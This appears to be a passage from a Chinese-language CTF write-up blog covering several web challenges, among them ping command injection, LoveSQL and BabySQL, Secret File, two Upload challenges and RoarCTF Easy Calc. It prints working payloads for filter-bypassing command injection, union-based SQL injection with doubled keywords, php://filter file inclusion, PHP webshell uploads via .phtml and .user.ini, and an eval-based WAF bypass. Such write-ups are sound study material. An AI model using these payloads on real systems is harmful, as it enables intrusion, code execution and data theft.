alt="image.png"><br>看得到ban了好多，flag是给ban掉了，得想办法绕过<br>payload：<code>cat$IFS$9</code>ls<code> </code>ls&#96;&#96;将ls的结果用cat读出来：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508171570-cc6f1b32-01bb-4777-aa5d-7992453fed8f.png#averageHue=%23fafafa&clientId=u702eb471-5f95-4&from=paste&height=398&id=ua43d096d&name=image.png&originHeight=497&originWidth=1133&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24156&status=done&style=none&taskId=u19115048-7696-4a0a-abca-128e1d7e205&title=&width=906.4" alt="image.png"></p>
<p><strong>解法二：</strong><br>使用一波变量拼接，payload：<br><code>1;a=ag.php;b=fl;cat$IFS$9$b$a</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665508229640-e5007815-cf21-47a0-ac99-2dbb29e15af3.png#averageHue=%23f8f7f6&clientId=u702eb471-5f95-4&from=paste&height=114&id=u04acfbc6&name=image.png&originHeight=143&originWidth=1360&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24503&status=done&style=none&taskId=u593e5778-468e-46f4-9f24-09ef2035990&title=&width=1088" alt="image.png"></p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509140571-5aa4724e-e8dc-4113-ba10-f6a880be179f.png#averageHue=%23070000&clientId=uc11732c4-29df-4&from=paste&height=332&id=u5bcb277c&name=image.png&originHeight=415&originWidth=1185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19848&status=done&style=none&taskId=u8f7c8d3c-029d-4126-8a42-cfd7c61af5c&title=&width=948" alt="image.png"><br>指定有什么私人仇恨，看网页源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509156487-893d8017-f925-40ad-b7d6-6c3407415134.png#averageHue=%23fcfcfc&clientId=uc11732c4-29df-4&from=paste&height=232&id=u8c75aa45&name=image.png&originHeight=290&originWidth=1404&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16538&status=done&style=none&taskId=uf5602979-f0db-49da-a3f3-3369b4d73b3&title=&width=1123.2" alt="image.png"><br>看到了个<code>archive_room</code>，访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509186504-6495f1d4-8817-41d5-9553-e84fe940e3f0.png#averageHue=%23130101&clientId=uc11732c4-29df-4&from=paste&height=280&id=ue2efbf6f&name=image.png&originHeight=350&originWidth=1011&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13691&status=done&style=none&taskId=u0e946ae9-fbd5-4745-9cb7-128af69bc49&title=&width=808.8" alt="image.png"><br>点击后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509192899-48016086-024f-4b8e-90a2-a3c879d33509.png#averageHue=%23060000&clientId=uc11732c4-29df-4&from=paste&height=263&id=ud5feed90&name=image.png&originHeight=329&originWidth=849&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8962&status=done&style=none&taskId=u7af90334-fa41-41af-afa5-6f366b11efc&title=&width=679.2" alt="image.png"><br>一眼抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509203792-2c052b81-4187-4f9d-b80a-c2203749a60f.png#averageHue=%23f7f7f7&clientId=uc11732c4-29df-4&from=paste&height=240&id=uf619e834&name=image.png&originHeight=300&originWidth=1162&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38561&status=done&style=none&taskId=u286833f0-6d08-4b9c-86d1-c7bb561f59e&title=&width=929.6" alt="image.png"><br>访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509217675-03b9193a-b3cb-4aa9-b1ed-27b70d1825e9.png#averageHue=%23fbfaf8&clientId=uc11732c4-29df-4&from=paste&height=258&id=udca0a79b&name=image.png&originHeight=323&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32911&status=done&style=none&taskId=ucc5481fd-ea71-47c9-b827-ae8d3e3a197&title=&width=696.8" alt="image.png"><br>简单的文件包含：</p>
<ul>
<li>strstr：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509377095-7d40ce92-36b8-4fb1-86a1-bace18b39b93.png#averageHue=%23f8f8f6&clientId=uc11732c4-29df-4&from=paste&height=446&id=uc69043d7&name=image.png&originHeight=558&originWidth=1130&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59454&status=done&style=none&taskId=u46e80d29-6990-4f68-a604-c15f4d273d4&title=&width=904" alt="image.png"></li>
<li>stristr：strstr的变种，就是不区分大小写了</li>
</ul>
<p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code><br>这里记得要用编码器，否则你会看到如下场面<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509242720-202f9141-769d-41a5-9f9d-a72c311b4cf6.png#averageHue=%23020201&clientId=uc11732c4-29df-4&from=paste&height=345&id=uf63e9b72&name=image.png&originHeight=431&originWidth=1733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29018&status=done&style=none&taskId=u99cfb1ff-15b0-4843-833c-9207b484446&title=&width=1386.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509247937-5648fdf4-c92e-4553-8ce5-62674f818f33.png#averageHue=%23fbfbfb&clientId=uc11732c4-29df-4&from=paste&height=391&id=u00cb012e&name=image.png&originHeight=489&originWidth=1744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52961&status=done&style=none&taskId=u48fc1e69-4eb2-4ebd-b3f9-d5f7a79d054&title=&width=1395.2" alt="image.png"><br>flag在哪？我不知道啊！，这边进行日志包含得到了webshell之后看了一下源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665509323137-45a234cf-6ff7-4bde-97eb-31324f1dbc4c.png#averageHue=%23fbfafa&clientId=uc11732c4-29df-4&from=paste&height=497&id=u321ae420&name=image.png&originHeight=621&originWidth=1257&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60098&status=done&style=none&taskId=u123a380b-8dfe-4dc5-8ff3-a3abd1a287f&title=&width=1005.6" alt="image.png"><br>假如你不编码的话include会解析，所以就看不到了。include不是高光函数，没办法看见定义的变量，所以得编码器编码一下</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665510809974-616b510d-ab9c-45a1-a5e2-8dc816edc810.png#averageHue=%23101010&clientId=u315c5201-685c-4&from=paste&height=619&id=u0e150fbe&name=image.png&originHeight=774&originWidth=1688&originalType=binary&ratio=1&rotation=0&showTitle=false&size=459506&status=done&style=none&taskId=uccc4a182-a9f2-4848-96d8-eb64167bf1c&title=&width=1350.4" alt="image.png"><br>你都让我用sqlmap了我还有什么说的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665510823152-39d09c58-e9ba-405f-ae0f-f5af6b5bde04.png#averageHue=%23161616&clientId=u315c5201-685c-4&from=paste&height=406&id=ue6d070af&name=image.png&originHeight=508&originWidth=960&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43871&status=done&style=none&taskId=u932ed893-beaa-4993-980a-b25697c2554&title=&width=768" alt="image.png"></p>
<p>手动注入：<br><code>?username=\&amp;password=union select 1,group_concat(id,username,password),3 from l0ve1ysq1-- -</code><br>咋来的就不多bb了就是联合注入而已</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665510963494-caa98dd6-090b-4249-b047-f4d6975151ba.png#averageHue=%23090000&clientId=u315c5201-685c-4&from=paste&height=326&id=ub4f3e510&name=image.png&originHeight=408&originWidth=782&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13839&status=done&style=none&taskId=u1c2f50b9-2b83-4ff1-b8b8-547af85c8db&title=&width=625.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665510966370-adfc1b3e-d751-4552-a044-908cd4125c27.png#averageHue=%23174f8d&clientId=u315c5201-685c-4&from=paste&height=51&id=uab1df2a9&name=image.png&originHeight=64&originWidth=227&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3324&status=done&style=none&taskId=u32922425-8ab1-4d83-8b2a-1cb2df9fa8a&title=&width=181.6" alt="image.png"><br>好啊我帮你捡来：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665510957067-ff4f8ad6-90af-48c0-8b7d-8eeba6b1a0d6.png#averageHue=%23efefef&clientId=u315c5201-685c-4&from=paste&height=247&id=u53a7d579&name=image.png&originHeight=309&originWidth=1319&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29852&status=done&style=none&taskId=ud164a48f-0a20-4af5-8941-62e2235e2d2&title=&width=1055.2" alt="image.png"></p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>比较好的一题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512648405-05d60e03-07f2-41dc-a9f0-f139b3773e87.png#averageHue=%232c3947&clientId=u315c5201-685c-4&from=paste&height=390&id=ua77c8520&name=image.png&originHeight=487&originWidth=1716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21581&status=done&style=none&taskId=u2590f7c2-c6cc-4a05-9d4a-cd274ebd36c&title=&width=1372.8" alt="image.png"><br>刚进去还是很蒙蔽的，找哪儿都找不到有效信息，最后百度搜了一下，发现burp的一个新功能就是网站地图，以下是他的介绍：</p>
<blockquote>
<p>站点地图中已请求的项目以黑色显示。尚未请求的项目以灰色显示。默认情况下（启用被动爬网），当您开始浏览典型应用程序时，大量内容将以灰色显示，甚至在您无法请求之前，因为 Burp 已在您请求的内容中发现了指向该内容的链接。通过设置适当的目标范围并使用站点地图显示过滤器，可以删除不感兴趣的内容（例如，在从目标应用程序链接到的其他域上）。</p>
<p>内容表显示了有关每个选定项目的关键详细信息（URL，HTTP 状态代码，页面标题等）。您可以根据任何列对表进行排序（单击列标题可在升序，降序和未排序之间循环）。如果您在表中选择一个项目，则该项目的请求和响应（如果有）显示在请求 &#x2F; 响应窗格中。它包含一个用于请求和响应的 HTTP 消息编辑器，提供对每个消息的详细分析。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512703088-105f316f-0445-4713-882d-53ec28e7eee1.png#averageHue=%23f8f4f1&clientId=u315c5201-685c-4&from=paste&height=394&id=u00fe4bde&name=image.png&originHeight=492&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83560&status=done&style=none&taskId=u99b4f654-40f3-460c-b7d8-45743a89301&title=&width=918.4" alt="image.png"><br>这个secret.php一开始是灰色的，也就是没发送请求，但是被动收到了，访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512743199-2d72e73c-80e5-4a30-b552-c696d3d5d430.png#averageHue=%23030303&clientId=u315c5201-685c-4&from=paste&height=440&id=u29a65c33&name=image.png&originHeight=550&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=343607&status=done&style=none&taskId=u51320dc4-7d6d-47b1-a741-08fd65a92f6&title=&width=1379.2" alt="image.png"><br>抓包添加referer：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512764592-f01aa766-0b03-4d29-a0bd-2d4e1a2e5323.png#averageHue=%239b9a9a&clientId=u315c5201-685c-4&from=paste&height=524&id=u01a6e8cb&name=image.png&originHeight=655&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215539&status=done&style=none&taskId=u678060db-6d35-4383-b05d-520c5be78b0&title=&width=982.4" alt="image.png"><br>添加user-agent:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512774593-a0b37fc3-a838-457b-a674-26355a40bfc2.png#averageHue=%239c9c9c&clientId=u315c5201-685c-4&from=paste&height=514&id=u4c396d99&name=image.png&originHeight=642&originWidth=1211&originalType=binary&ratio=1&rotation=0&showTitle=false&size=209062&status=done&style=none&taskId=ufc25c7a2-58e3-4346-8e32-2c40ec54c98&title=&width=968.8" alt="image.png"><br>添加XFF头：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512801347-5859c7b3-5f59-4966-8592-0061feb443ec.png#averageHue=%23999898&clientId=u315c5201-685c-4&from=paste&height=485&id=ud5264a17&name=image.png&originHeight=606&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=214406&status=done&style=none&taskId=u10ddb639-bfe7-478d-aa31-e8ea2c06f30&title=&width=982.4" alt="image.png"></p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512902188-9b74368b-79ff-4f0f-957d-4de0ccf2485f.png#averageHue=%23485a83&clientId=u315c5201-685c-4&from=paste&height=382&id=u32ff5fb2&name=image.png&originHeight=478&originWidth=1375&originalType=binary&ratio=1&rotation=0&showTitle=false&size=599372&status=done&style=none&taskId=u885766aa-fe4b-4278-a45f-305c0ff3186&title=&width=1100" alt="image.png"><br>要上传图片类型，上传个png抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665512925603-21b54145-2565-4c29-8944-3cda2fe3f9e6.png#averageHue=%23c6d1b1&clientId=u315c5201-685c-4&from=paste&height=401&id=uf63d5dda&name=image.png&originHeight=501&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75775&status=done&style=none&taskId=u684d9ecf-b502-4e86-a535-08edc453902&title=&width=965.6" alt="image.png"><br>emm不能有&lt;?,那简单，我们用短标签<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514303823-16a75b6e-7367-4c8b-9052-4e8b0a7af42b.png#averageHue=%23f4f3f3&clientId=uce83ccd1-c6a6-4&from=paste&height=430&id=u34326706&name=image.png&originHeight=538&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44355&status=done&style=none&taskId=u01a256b4-1f75-4ad9-a1ff-894c3fee29f&title=&width=475.2" alt="image.png"><br>加一个gif文件头：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514332367-6f7d0d71-e237-4592-b84e-c498be05182a.png#averageHue=%23b0c8a8&clientId=uce83ccd1-c6a6-4&from=paste&height=418&id=uaeb0fdcd&name=image.png&originHeight=522&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64311&status=done&style=none&taskId=u46389a93-6968-4e05-bf75-6d343201f57&title=&width=948.8" alt="image.png"><br>总算是上去了，再往里面加个.user.ini:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665513312544-9e6ec6b4-ccc7-47fe-9fa0-867e982004ec.png#averageHue=%23bec9ab&clientId=uf5078b76-a6fd-4&from=paste&height=427&id=u978bc47e&name=image.png&originHeight=534&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62055&status=done&style=none&taskId=u8a78b633-e1a4-4edd-ac8d-11ba18a0e83&title=&width=936.8" alt="image.png"><br>然后就该找到底该往哪儿去干呢，然后误打误撞发现有个upload文件夹：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514372419-18d81d1a-88dc-401a-bd35-86043e393fbf.png#averageHue=%23f9f9f8&clientId=u2c8c4a07-4e97-4&from=paste&height=397&id=u0fbc510c&name=image.png&originHeight=496&originWidth=1156&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61900&status=done&style=none&taskId=u284b2d62-c582-49f2-9706-08c1ca6f3ab&title=&width=924.8" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514380590-0f479b4b-2bba-4676-afb2-307a818a3bed.png#averageHue=%23f5f3f0&clientId=u2c8c4a07-4e97-4&from=paste&height=150&id=ue11a07c9&name=image.png&originHeight=188&originWidth=1092&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41223&status=done&style=none&taskId=ub8ee7653-5016-4cf5-a0c0-106e357ec21&title=&width=873.6" alt="image.png"><br>我们的user.ini文件没有被上传，我也不知道为啥，但是我们可以用phtml文件后缀，在上面可以看到上传成功，什么是phtml？</p>
<blockquote>
<p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；<br>完全是php写的，则使用php作为后缀名。<br>这两种文件，web服务器都会用php解释器进行解析。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514426609-51dd3c8f-1360-4182-9e04-649db823cbdc.png#averageHue=%23848483&clientId=u2c8c4a07-4e97-4&from=paste&height=648&id=ubf71d5ed&name=image.png&originHeight=810&originWidth=1444&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94090&status=done&style=none&taskId=ucfd74400-943c-4f9c-96d8-97fe4f93728&title=&width=1155.2" alt="image.png"><br>RCE成功，QWQ，这边用html文件也可以，因为本质上就是个js语句，这一题就很怪，要猜得出来文件夹是upload。。。</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514644189-e7d5e28c-e772-4f42-8636-15f3a8309afc.png#averageHue=%232a2f3e&clientId=u2c8c4a07-4e97-4&from=paste&height=552&id=uf0f86876&name=image.png&originHeight=690&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=305909&status=done&style=none&taskId=u5a9b061f-4325-43da-b034-51b3048a224&title=&width=1384" alt="image.png"><br>xio灯泡儿，把鼠标放上去就看到了文件上传，这边抓个包儿~：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514854590-68914c87-0ea8-41eb-8dff-c7bae6d7048e.png#averageHue=%23b4b89a&clientId=u2c8c4a07-4e97-4&from=paste&height=473&id=u56d5917d&name=image.png&originHeight=591&originWidth=1213&originalType=binary&ratio=1&rotation=0&showTitle=false&size=255838&status=done&style=none&taskId=u12ecd4e5-6d73-4188-80b6-01f3c7ec6ce&title=&width=970.4" alt="image.png"><br>emmm这就可以上传拉？后缀名改成phtml：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514870070-d95e6e04-5bac-470d-887e-2b458f937d6e.png#averageHue=%23acad8d&clientId=u2c8c4a07-4e97-4&from=paste&height=386&id=u727a17a5&name=image.png&originHeight=482&originWidth=1208&originalType=binary&ratio=1&rotation=0&showTitle=false&size=217400&status=done&style=none&taskId=u39ce7b2b-2a26-4f9d-8496-1e6d88e244e&title=&width=966.4" alt="image.png"><br>？？？？成功？然后直接rce：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514880882-845b75a1-6e82-461b-8bfa-e8a8bd764dff.png#averageHue=%23969696&clientId=u2c8c4a07-4e97-4&from=paste&height=652&id=u192c0283&name=image.png&originHeight=815&originWidth=1434&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85841&status=done&style=none&taskId=ub9c78059-1e8d-40cd-966e-35fc9553c6b&title=&width=1147.2" alt="image.png"><br>好蠢的题</p>
<p>我猜一下预期解是什么，上传png图片，用.user.ini去绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665514909506-9df6a00c-36a5-4091-9dd4-37d4ac66ec94.png#averageHue=%237e816b&clientId=u2c8c4a07-4e97-4&from=paste&height=383&id=uc66d329a&name=image.png&originHeight=479&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=213488&status=done&style=none&taskId=u020ae946-0c48-43b0-8719-02f615de90f&title=&width=912.8" alt="image.png"><br>可以上传.user.ini，内容不重要改一下就好</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665515827658-a3ca1e77-ec85-4109-a927-ad4c14929d67.png#averageHue=%23101010&clientId=u6887e62c-dde7-4&from=paste&height=596&id=u78340bec&name=image.png&originHeight=745&originWidth=1814&originalType=binary&ratio=1&rotation=0&showTitle=false&size=463061&status=done&style=none&taskId=ue1346b5c-971f-433b-8246-de16a512b0a&title=&width=1451.2" alt="image.png"><br>你好啊cl4y又见面了，这次又来暴打你了，这一次捏我就不多BB了，经过一些fuzz，发现过滤了<code>select</code>,<code>or</code>,<code>where</code>,<code>from</code>这些都可以用双写去绕过！！！<br>所以直接上一下payload<br><code>?username=1&#39; uniunionon seselectlect 1,group_concat(password),3 frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;-- -&amp;password=1</code><br>这一串可以查出表名，列名，接下来我就粗略的讲一下如何判断是不是双写绕过</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665515941094-3e105f79-d9a6-4b9a-8746-6164488eea39.png#averageHue=%23121211&clientId=u6887e62c-dde7-4&from=paste&height=505&id=u2658444f&name=image.png&originHeight=631&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=294882&status=done&style=none&taskId=u369a2860-6719-4033-91dd-20c7a555527&title=&width=1536" alt="image.png"><br>首先加单引号是有报错的，那就必然存在sql注入，然后用一下万能密码你会发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665515972300-666b3cd9-ce1e-49dd-93ea-a871e7b9881c.png#averageHue=%23131212&clientId=u6887e62c-dde7-4&from=paste&height=506&id=u2e5e721c&name=image.png&originHeight=632&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=292056&status=done&style=none&taskId=ud484e32b-0dd3-45ad-8a09-70a045b4fa7&title=&width=1536" alt="image.png"><br>这里看不清楚，注意报错信息是<code> &#39;1=1-- -&#39; and password=&#39;1&#39;&#39;</code>我们的or去哪儿了？？？<br>我们假如这样payload：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665516023955-94208ba2-85c2-4c93-abb6-b02d573fc794.png#averageHue=%23151515&clientId=u6887e62c-dde7-4&from=paste&height=414&id=u3b6c99be&name=image.png&originHeight=517&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=246526&status=done&style=none&taskId=ud93ff117-e254-488e-ab0e-01cf4b3ba6a&title=&width=1536" alt="image.png"><br>你会发现报错信息变成了’<code>123 1=1-- -&#39; and password=&#39;1&#39;&#39;</code>看到没，也就是说or被替换成了空字符，接下来所有的都是这么测试出来的很简单的题<br>很简单很简单</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>U1S1我觉得这题最没含金量，这题的考点看题目就知道，备份文件，但是备份文件那么多是sql还是他妈的php文件也没整明白啊，试了半天发现是<code>index.php.bak</code>你他吗告诉我假如人家稍微改一下名字你怎么猜啊？？？这不是常规思路知道吗，还不让扫目录，这题太烂了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665517357959-0fca56f9-6564-4741-bf88-6b41ee24a198.png#averageHue=%23363e47&clientId=u6887e62c-dde7-4&from=paste&height=338&id=u2fb415c1&name=image.png&originHeight=422&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32890&status=done&style=none&taskId=uf3a75795-d668-497f-9763-bbf13fb8cc9&title=&width=464" alt="image.png"><br>直接输入123即可</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>今晚质量最高的题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520055061-78972062-d0d1-476a-96cb-a4a5a16b83f5.png#averageHue=%23fdfcfc&clientId=uad4724a0-a71a-4&from=paste&height=280&id=uf102d758&name=image.png&originHeight=350&originWidth=1750&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27470&status=done&style=none&taskId=ub746596e-50f6-4c24-9778-dda1106b2f0&title=&width=1400" alt="image.png"><br>一个界面，直接访问源代码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520066620-fdb43cfd-3604-4c6b-9134-c812f724644e.png#averageHue=%23fafafa&clientId=uad4724a0-a71a-4&from=paste&height=268&id=u637e69ed&name=image.png&originHeight=335&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17053&status=done&style=none&taskId=u16ead5ec-3d61-4185-8338-77e842faca3&title=&width=861.6" alt="image.png"><br>抓到calc.php：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520081705-1c0d9cec-e183-46be-8701-0bb444f64ab4.png#averageHue=%23fefefd&clientId=uad4724a0-a71a-4&from=paste&height=290&id=u69b8b59b&name=image.png&originHeight=362&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14437&status=done&style=none&taskId=u5fce654d-8f33-4259-bd99-cee40da7349&title=&width=812" alt="image.png"><br>看起来是不是很简单，但是经过测试发现你只要输入一个字母就会给你检测到WAF：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520111197-e98fcc4e-e60a-4760-9a97-7caa7ac97664.png#averageHue=%23f2f1f0&clientId=uad4724a0-a71a-4&from=paste&height=247&id=u0e36ae6d&name=image.png&originHeight=309&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29169&status=done&style=none&taskId=u96f572a8-c0ff-43b8-bc77-97885f327a2&title=&width=648.8" alt="image.png"><br>后面去了解了一下，发现可以在num前面加空格来绕过WAF,具体介绍如下：</p>
<blockquote>
<p>你传了一个” num”的值，而waf正在抓名字叫做”num”的变量，碰到” num”时，” num”说你找的是”num”,与我” num”有何关系，说罢扬长而去。 而后在php对字符串解析的时候，将” num”多余的空格直接砍去，这样的话，我们就传入了”num”,并且还传入了我们希望的值。 同时，根据前面的num&#x3D;phpinfo();判断后端会执行num的代码。<br>–<a target="_blank" rel="noopener" href="https://www.yangshuaibin.com/detail/392376">https://www.yangshuaibin.com/detail/392376</a></p>
</blockquote>
<p>php解析的时候是会把空格给省去，可以本地测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520230242-c245102d-83a2-4d63-9618-5449c38ab410.png#averageHue=%23e6d69e&clientId=uad4724a0-a71a-4&from=paste&height=105&id=u906e08a4&name=image.png&originHeight=131&originWidth=832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11947&status=done&style=none&taskId=u631fdb3a-2ca0-4d6e-85ae-7c5bb9e956e&title=&width=665.6" alt="image.png"><br>看到没，你加几个空格都无济于事，但是防火墙就不这么认为了</p>
<p>之后就可以发现我们能用一些函数了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520299620-56b496fd-3e9b-4afc-842b-6ff37fd6abd5.png#averageHue=%23d8cea7&clientId=uad4724a0-a71a-4&from=paste&height=432&id=u0e83886a&name=image.png&originHeight=540&originWidth=1737&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95995&status=done&style=none&taskId=ud00cb38c-31e6-45e4-afbb-b3970ce1ec8&title=&width=1389.6" alt="image.png"><br>经过测试，我们无法使用的函数还是有<code>system</code>，system可以用，但是你加了单引号或者是ls就没有回显，估计也是过滤了，echo也同理，<code>include</code>,<code>highlight_file</code><br>这一题我们用一下参数逃逸了，首先<code>chr()</code>函数大家应该还认得吧，我们用这个来读取文件，payload<br><code>var_dump(scandir(chr(47)));</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520406909-cd761fab-4a84-4517-ad74-6bc9d688274f.png#averageHue=%23e3bb77&clientId=uad4724a0-a71a-4&from=paste&height=154&id=u7b10c238&name=image.png&originHeight=192&originWidth=1754&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45895&status=done&style=none&taskId=u2627f2cd-c9b2-4ccf-a100-e65c3f3fb55&title=&width=1403.2" alt="image.png"><br>扫描到了根目录有f1agg文件<br>之后就用参数逃逸了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?%<span class="number">20</span>num=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())))</span><br><span class="line">POST:<span class="number">1</span>=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;/f1agg&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665520443003-31e37792-5af0-4c13-a35c-8c4aa8d5dadd.png#averageHue=%23ddc6a9&clientId=uad4724a0-a71a-4&from=paste&height=62&id=u3621088f&name=image.png&originHeight=77&originWidth=420&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4377&status=done&style=none&taskId=ua559a7d1-b991-426c-98b6-737d28d1834&title=&width=336" alt="image.png"></p>
<p>或者你可以用字符串拼接：<br><code>?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
